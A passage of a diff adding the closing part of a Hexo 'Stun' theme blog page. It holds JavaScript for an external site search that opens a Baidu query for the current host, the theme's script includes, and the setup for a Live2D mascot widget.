+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', 'Please enter characters');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>
